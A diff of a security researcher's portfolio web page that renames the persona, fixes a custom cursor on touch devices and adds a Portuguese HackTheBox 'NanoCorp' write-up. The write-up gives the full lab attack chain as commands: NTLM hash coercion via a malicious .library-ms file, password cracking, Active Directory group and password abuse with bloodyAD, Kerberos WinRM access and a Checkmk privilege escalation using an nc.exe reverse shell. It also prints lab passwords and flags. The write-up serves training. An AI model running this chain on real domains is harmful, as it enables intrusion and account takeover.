@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>S1lentNight // Offensive Security Researcher</title>
+  <title>Rel3ase // Offensive Security Researcher</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet" />
   <style>
@@ -34,7 +34,6 @@
       background: var(--bg);
       color: var(--text);
       font-family: var(--font-mono);
-      cursor: none;
       overflow-x: hidden;
       line-height: 1.6;
     }
@@ -869,9 +868,11 @@
     }
 
     /* ============================================================
-       SCROLLBAR
+       CUSTOM CURSOR — hidden on touch devices
     ============================================================ */
-    ::-webkit-scrollbar { width: 4px; }
+    /* ============================================================
+       SCROLLBAR
+    ============================================================ */    ::-webkit-scrollbar { width: 4px; }
     ::-webkit-scrollbar-track { background: var(--bg); }
     ::-webkit-scrollbar-thumb { background: var(--red-dim); border-radius: 2px; }
     ::-webkit-scrollbar-thumb:hover { background: var(--red); }
@@ -889,6 +890,10 @@
       section { padding: 3.5rem 0; }
       .cards-grid { grid-template-columns: 1fr; }
       .writeups-grid { grid-template-columns: 1fr; }
+      /* Fix scroll on touch devices */
+      body { cursor: auto; touch-action: pan-y; }
+      * { touch-action: pan-y; }
+      #cursor-dot, #cursor-ring { display: none !important; }
     }
     @media (max-width: 480px) {
       nav { display: none; }
@@ -916,7 +921,7 @@
   <header>
     <div class="logo">
       <span class="logo-bracket">[</span>
-      S1LENTNIGHT
+      REL3ASE
       <span class="logo-bracket">]</span>
       <span class="logo-blink"></span>
     </div>
@@ -938,10 +943,10 @@
     <canvas id="hero-canvas"></canvas>
     <div class="hero-inner">
       <div class="hero-tag">&gt;&gt; Offensive Security Researcher</div>
-      <div class="hero-name" id="hero-name">S1LENTNIGHT</div>
+      <div class="hero-name" id="hero-name">REL3ASE</div>
       <div class="hero-sub" id="hero-sub"></div>
       <p class="hero-desc">
-        Red Team | Exploit Developer | Vulnerability Researcher<br />
+        Red Team | Bug Hunter | Vulnerability Researcher<br />
         Hunting attack surfaces others overlook.
       </p>
       <div class="hero-cta">
@@ -967,16 +972,14 @@
   <section id="about">
     <div class="container">
       <div class="section-label reveal">Intel Profile</div>
-      <h2 class="section-title reveal">Who is <em>S1lentNight</em></h2>
+      <h2 class="section-title reveal">Who is <em>Rel3ase</em></h2>
 
       <div class="about-grid">
         <div class="about-text reveal">
-          <div class="classified-stamp">&#9632; Classified // Level III</div>
+          <div class="classified-stamp">&#9632; Classified // Level Apprentice</div>
           <p>
-            Offensive security researcher with a <strong>deep focus on Red Team operations</strong>,
-            exploit development, and adversary simulation.
-            My methodology is rooted in <span class="hl">precision, patience, and persistence</span> —
-            the same mindset used by advanced threat actors.
+            Offensive security researcher with a <strong>deep focus on Red Team operations</strong>
+            and adversary simulation.
           </p>
           <p>
             I approach every target the same way: <strong>understand the architecture,
@@ -986,7 +989,7 @@
           </p>
           <p>
             Currently studying APT simulation methodologies using
-            <span class="hl">MITRE ATT&CK</span>, C2 frameworks (Havoc / Sliver / Mythic),
+            <span class="hl">MITRE ATT&CK</span>, C2 frameworks (Havoc C2 / Cobalt Strike),
             and adversarial tooling. Oriented toward <span class="hl">Bug Bounty</span> and
             professional Red Team engagements.
           </p>
@@ -999,11 +1002,10 @@
               <span class="skill-tag">Red Team Ops</span>
               <span class="skill-tag">APT Simulation</span>
               <span class="skill-tag">C2 Frameworks</span>
-              <span class="skill-tag">Exploit Dev</span>
-              <span class="skill-tag">Phishing / SE</span>
+              <span class="skill-tag">Phishing</span>
               <span class="skill-tag">MITRE ATT&CK</span>
               <span class="skill-tag">Bug Bounty</span>
-              <span class="skill-tag">Malware Analysis</span>
+              <span class="skill-tag">CTI — Cyber Threat Intelligence</span>
               <span class="skill-tag">Post-Exploitation</span>
               <span class="skill-tag">CTF / HTB</span>
             </div>
@@ -1031,6 +1033,11 @@
               <a class="social-link" href="https://app.hackingclub.com/profile/user/19986" target="_blank" rel="noopener">
                 <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
                 <span><span class="lk-label">HC:</span>HackingClub Profile</span>
+              </a>
+              <!-- HackTheBox -->
+              <a class="social-link" href="https://app.hackthebox.com/users/2282037?profile-top-tab=machines&ownership-period=1M&profile-bottom-tab=prolabs" target="_blank" rel="noopener">
+                <svg viewBox="0 0 24 24"><path d="M12 2l9 5v6l-9 5-9-5V7l9-5zm0 2.18L5 8.09V12l7 3.91 7-3.91V8.09L12 4.18z"/></svg>
+                <span><span class="lk-label">HTB:</span>HackTheBox Profile</span>
               </a>
             </div>
           </div>
@@ -1085,18 +1092,19 @@
   ==================================================== -->
   <footer>
     <div class="footer-inner">
-      <div class="footer-logo">[ S1LENTNIGHT.SEC ]</div>
+      <div class="footer-logo">[ REL3ASE.SEC ]</div>
       <div class="footer-links">
         <a href="https://github.com/releaseown" target="_blank">GitHub</a>
         <a href="https://www.linkedin.com/in/rianjunior/" target="_blank">LinkedIn</a>
         <a href="https://x.com/S1lentNightSf" target="_blank">X</a>
         <a href="https://app.hackingclub.com/profile/user/19986" target="_blank">HackingClub</a>
+        <a href="https://app.hackthebox.com/users/2282037" target="_blank">HackTheBox</a>
       </div>
       <p class="footer-quote">
         "The quietest systems are often the most dangerous ones."
       </p>
       <div class="footer-bottom">
-        &copy; <span id="footer-year"></span> <span>S1LENTNIGHT</span> — All Rights Reserved.
+        &copy; <span id="footer-year"></span> <span>REL3ASE</span> — All Rights Reserved.
         &nbsp;|&nbsp; Offensive Security Researcher
       </div>
     </div>
@@ -1151,6 +1159,99 @@
     },
     */
     // ── Adicione seus writeups abaixo ──
+    {
+      id: 1,
+      title: "NanoCorp — HackTheBox",
+      platform: "Hack The Box",
+      date: "2025-11-14",
+      difficulty: "hard",
+      image: "",
+      description: "Windows Server 2022 / Active Directory. Cadeia de ataque multi-estágio: NTLM hash leak 0-click via CVE-2025-24071, abuso de DACL no AD (AddSelf → ForceChangePassword), acesso WinRM via Kerberos e escalação de privilégio pelo agente Checkmk (CVE-2024-0670).",
+
+      methodology: `
+<strong>// 01 — Port Scan & Reconnaissance</strong><br/><br/>
+<code>sudo nmap -sV -O -sC -sT -v nanocorp.htb</code><br/><br/>
+Portas abertas identificadas no DC (<code>10.10.11.93</code>):<br/>
+<code>53</code> DNS · <code>80</code> HTTP (Apache 2.4.58 / PHP 8.2) · <code>88</code> Kerberos · <code>135/139/445</code> RPC/SMB · <code>389/636/3268/3269</code> LDAP/LDAPS · <code>5986</code> WinRM-SSL<br/><br/>
+O certificado em <code>5986</code> confirma o hostname <code>dc01.nanocorp.htb</code>. Clock-skew de ~6h31m detectado — sincronização necessária antes de usar Kerberos.<br/><br/>
+
+<strong>// 02 — Foothold: CVE-2025-24071 — 0-click NTLM Hash Leak</strong><br/><br/>
+Na porta 80 existe um painel de upload de arquivos ZIP. A vulnerabilidade abusa do comportamento do Windows Explorer ao processar arquivos <code>.library-ms</code>:<br/><br/>
+Quando um <code>.library-ms</code> é extraído (ou até visualizado), o Explorer lê o XML interno e tenta acessar automaticamente a tag <code>&lt;url&gt;</code> via SMB — disparando uma autenticação NTLM sem interação do usuário.<br/><br/>
+O exploit gera o arquivo malicioso e empacota em ZIP:<br/>
+<code>&lt;url&gt;\\\\10.10.14.103\\shared&lt;/url&gt;</code><br/><br/>
+Com o Responder ouvindo na interface <code>tun0</code>, o hash foi capturado assim que o ZIP foi processado pelo servidor:<br/><br/>
+<code>web_svc::NANOCORP:38a74873a2057e77:55741262F91D...→ NetNTLMv2</code><br/><br/>
+Hash quebrado com hashcat (<code>-m 5600</code>) + rockyou.txt em ~1 segundo:<br/>
+<code>WEB_SVC : dksehdgh712!@#</code><br/><br/>
+
+<strong>// 03 — AD Enumeration com BloodHound</strong><br/><br/>
+<code>bloodhound-python -d nanocorp.htb -u WEB_SVC -p 'dksehdgh712!@#' -c All -ns 10.10.11.93</code><br/><br/>
+Resultado relevante:<br/>
+→ 6 usuários encontrados → <code>monitoring_svc</code> é o alvo<br/>
+→ 0 trusts → sem possibilidade de movimento lateral por certificate trust<br/>
+→ Grupo <code>IT_SUPPORT</code> identificado em <code>CN=USERS</code><br/><br/>
+Caminho de ataque mapeado pelo BloodHound:<br/>
+<code>web_svc</code> tem <strong>AddSelf</strong> em <code>IT_SUPPORT</code> →<br/>
+<code>IT_SUPPORT</code> tem <strong>ForceChangePassword</strong> sobre <code>monitoring_svc</code> →<br/>
+<code>monitoring_svc</code> membro de <strong>Remote Management Users</strong> → WinRM no DC
+      `,
+
+      exploitation: `
+<strong>// 04 — DACL Abuse: web_svc → IT_SUPPORT → monitoring_svc</strong><br/><br/>
+Adicionando <code>web_svc</code> ao grupo <code>IT_SUPPORT</code>:<br/>
+<code>bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember it_support web_svc</code><br/>
+<code>[+] web_svc added to it_support</code><br/><br/>
+Alterando a senha do <code>monitoring_svc</code>:<br/>
+<code>bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Rele4ase123$!'</code><br/>
+<code>[+] Password changed successfully!</code><br/><br/>
+
+<strong>// 05 — Acesso WinRM via Kerberos (porta 5986 SSL)</strong><br/><br/>
+<code>impacket-getTGT -dc-ip 10.10.11.93 'nanocorp.htb/monitoring_svc:Rele4ase123$!'</code><br/>
+<code>export KRB5CCNAME=monitoring_svc.ccache</code><br/><br/>
+O <code>evil-winrm</code> padrão falha pois o WinRM está em HTTPS/5986. Solução via <code>winrmexec.py</code>:<br/>
+<code>python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass</code><br/><br/>
+Shell obtido como <code>monitoring_svc</code>. <strong>User flag capturada.</strong><br/>
+<code>type user.txt → 01b2848957245ab8b1350efd30efda3b</code><br/><br/>
+
+<strong>// 06 — Privilege Escalation: CVE-2024-0670 (Checkmk MSI Repair)</strong><br/><br/>
+Em <code>C:\\Windows\\Temp</code> existe o binário <code>RunasCs.exe</code> que permite executar processos como outro usuário. O agente Checkmk roda como SYSTEM e é vulnerável a uma race condition no caminho de repair do MSI.<br/><br/>
+O exploit (<code>fuck.ps1</code>) faz:<br/>
+1. Localiza o MSI do Checkmk via registro: <code>HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\...DisplayName -like '*mk*'</code><br/>
+2. Semeia arquivos <code>.cmd</code> read-only em <code>C:\\Windows\\Temp\\</code> com o payload de reverse shell para <code>nc.exe</code><br/>
+3. Dispara o repair: <code>msiexec.exe /fa [msi_path] /qn</code><br/><br/>
+Execução via RunasCs como <code>web_svc</code>:<br/>
+<code>RunasCs.exe web_svc "dksehdgh712!@#" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\fuck.ps1"</code><br/><br/>
+Apesar do erro de output, a conexão reversa chega no listener como <strong>SYSTEM / Administrator</strong>.<br/>
+<code>type root.txt → 791ce35038852fa2c789c840325db122</code>
+      `,
+
+      conclusion: `
+<strong>// Possible threat actor — 0day origin</strong><br/><br/>
+<div style="border:1px dashed #7f1c14;padding:1rem;margin-bottom:1.5rem;background:rgba(127,28,20,.08);text-align:center;">
+  <img id="actor-img" src="" alt="Possible actor who shared the 0day exploit"
+    style="max-width:100%;max-height:260px;object-fit:contain;margin:0 auto;display:block;filter:grayscale(30%);"
+    onerror="this.style.display='none';document.getElementById('actor-img-placeholder').style.display='flex'"/>
+  <div id="actor-img-placeholder" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:120px;gap:.8rem;">
+    <span style="font-size:1.8rem;color:#7f1c14;">&#9632;</span>
+    <span style="font-size:.68rem;letter-spacing:.2em;color:#7f1c14;text-transform:uppercase;">
+      // Substitua o src do &lt;img id="actor-img"&gt; pela URL ou caminho da sua imagem
+    </span>
+  </div>
+  <p style="font-size:.65rem;color:#7f1c14;letter-spacing:.15em;text-transform:uppercase;margin-top:.8rem;">
+    &#9632; Possible actor who shared the CVE-2025-24071 0day
+  </p>
+</div>
+
+<strong>// Key Takeaways</strong><br/><br/>
+• <strong>CVE-2025-24071</strong> é um vetor de coerção NTLM 0-click. Qualquer plataforma que processa ZIPs contendo <code>.library-ms</code> é potencialmente vulnerável — sem interação do usuário.<br/><br/>
+• <strong>DACL misconfigurations</strong> são invisíveis para a maioria dos defensores, mas trivialmente exploráveis com BloodHound. <code>AddSelf</code> + <code>ForceChangePassword</code> é uma cadeia clássica e ainda comum em ambientes reais.<br/><br/>
+• <strong>WinRM sobre HTTPS na porta 5986</strong> quebra o tooling padrão (evil-winrm assume 5985/HTTP). Sempre verificar serviços SSL durante a enumeração.<br/><br/>
+• <strong>CVE-2024-0670</strong> demonstra o perigo de agentes de monitoramento rodando como SYSTEM. Race conditions em caminhos de repair de MSI são um vetor de LPE clássico e frequentemente ignorado.<br/><br/>
+• NanoCorp demonstra como uma cadeia de misconfigs individualmente "baixo risco" pode levar a comprometimento total do domínio — espelhando caminhos de ataque de APTs reais.<br/><br/>
+<code style="color:#e53935;">// Auth: @Rel3ase — github.com/releaseown</code>
+      `,
+    },
   ];
   </script>
 
@@ -1162,39 +1263,51 @@
   const dot  = document.getElementById('cursor-dot');
   const ring = document.getElementById('cursor-ring');
   let mx = 0, my = 0, rx = 0, ry = 0;
-  document.addEventListener('mousemove', e => { mx = e.clientX; my = e.clientY; });
-  (function animCursor() {
-    rx += (mx - rx) * .18;
-    ry += (my - ry) * .18;
-    dot.style.left  = mx + 'px';
-    dot.style.top   = my + 'px';
-    ring.style.left = rx + 'px';
-    ring.style.top  = ry + 'px';
-    requestAnimationFrame(animCursor);
-  })();
+  // Detect touch-primary devices and disable custom cursor entirely
+  const isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+  const isHoverCapable = window.matchMedia('(hover: hover) and (pointer: fine)').matches;
+
+  if (isHoverCapable && !isTouchDevice) {
+    // Desktop with mouse — enable custom cursor
+    document.body.style.cursor = 'none';
+    document.addEventListener('mousemove', e => { mx = e.clientX; my = e.clientY; });
+    (function animCursor() {
+      rx += (mx - rx) * .18;
+      ry += (my - ry) * .18;
+      dot.style.left  = mx + 'px';
+      dot.style.top   = my + 'px';
+      ring.style.left = rx + 'px';
+      ring.style.top  = ry + 'px';
+      requestAnimationFrame(animCursor);
+    })();
+  } else {
+    // Touch / mobile — restore native cursor and scroll
+    document.body.style.cursor = 'auto';
+    dot.style.display  = 'none';
+    ring.style.display = 'none';
+  }
 
   /* ─── BOOT SCREEN ─── */
   const bootLines = [
     "BIOS v4.2.1 — Initializing secure subsystems...",
-    "[ + ] Cryptographic module loaded",
-    "[ + ] Network interface: STEALTH mode",
-    "[ + ] OPSEC layer activated",
+    "[ OK ] Cryptographic module loaded",
+    "[ OK ] Network interface: STEALTH mode",
+    "[ OK ] OPSEC layer activated",
     "[ .. ] Loading operator profile...",
-    "[ + ] Profile found: S1LENTNIGHT",
-    "[ + ] Clearance level: III — UNRESTRICTED",
+    "[ OK ] Profile found: REL3ASE",
+    "[ OK ] Clearance level: III — UNRESTRICTED",
     "[ .. ] Establishing secure tunnel...",
     "[ OK ] C2 channel active",
     "",
-    "  ███████╗ ██╗██╗     ███████╗███╗   ██╗████████╗",
-    "  ██╔════╝ ██║██║     ██╔════╝████╗  ██║╚══██╔══╝",
-    "  ███████╗ ██║██║     █████╗  ██╔██╗ ██║   ██║   ",
-    "  ╚════██║ ██║██║     ██╔══╝  ██║╚██╗██║   ██║   ",
-    "  ███████║ ██║███████╗███████╗██║ ╚████║   ██║   ",
-    "  ╚══════╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ",
+    "  ██████╗ ███████╗██╗     ██████╗  █████╗ ███████╗███████╗",
+    "  ██╔══██╗██╔════╝██║     ╚════██╗██╔══██╗██╔════╝██╔════╝",
+    "  ██████╔╝█████╗  ██║      █████╔╝███████║███████╗█████╗  ",
+    "  ██╔══██╗██╔══╝  ██║      ╚═══██╗██╔══██║╚════██║██╔══╝  ",
+    "  ██║  ██║███████╗███████╗██████╔╝██║  ██║███████║███████╗ ",
+    "  ╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝",
     "",
     "  OFFENSIVE SECURITY RESEARCHER — SYSTEM READY",
     "  ACCESS GRANTED.",
-    "[ + ] Welcome! ..."
   ];
 
   const bootTextEl = document.getElementById('boot-text');
@@ -1297,10 +1410,9 @@
   /* ─── HERO TYPING SUBTITLE ─── */
   const subtitles = [
     'Red Team Operator',
-    'Exploit Developer',
+    'Bug Hunter',
     'Vulnerability Researcher',
     'APT Simulation Specialist',
-    'Bug Bounty Hunter',
   ];
   const subEl = document.getElementById('hero-sub');
   let si = 0, ci = 0, deleting = false;
